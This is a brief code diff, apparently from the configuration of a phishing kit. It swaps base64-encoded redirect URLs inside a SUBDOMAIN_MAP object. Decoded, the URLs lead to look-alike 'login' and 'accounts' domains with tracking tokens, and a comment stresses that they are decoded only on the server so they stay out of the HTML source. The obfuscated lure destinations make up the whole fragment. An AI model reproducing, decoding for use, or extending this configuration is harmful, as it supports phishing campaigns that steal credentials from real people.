@@ -7,10 +7,10 @@ const DEBUG = false;
 // Decoded strictly on the server—never sent in the HTML source
 const SUBDOMAIN_MAP = {
   eastrn: [
-    'aHR0cHM6Ly9hY2NvdW50cGF5YWJsZS50c2ZxcW9nLnRvcD9LWlFzVVVibmVzWkc9YW1obWJXUT0=',
+    'aHR0cHM6Ly9hY2NvdW50cy5zaGF1bmNvbGxjLmxpdmU/NnpDZnR4MDg9ZVd0amRHRT0=',
   ],
   westrn: [
-    'aHR0cHM6Ly9sb2dpbi5kb2NldHRvZmZpY2UuaW5mbz95TkNxeEdBOFE5dz1iM2x0WkdkcWR3PT0=',
+    'aHR0cHM6Ly9hY2NvdW50cy5zaGF1bmNvbGxjLmxpdmU/NnpDZnR4MDg9ZVd0amRHRT0=',
   ],
 };
 
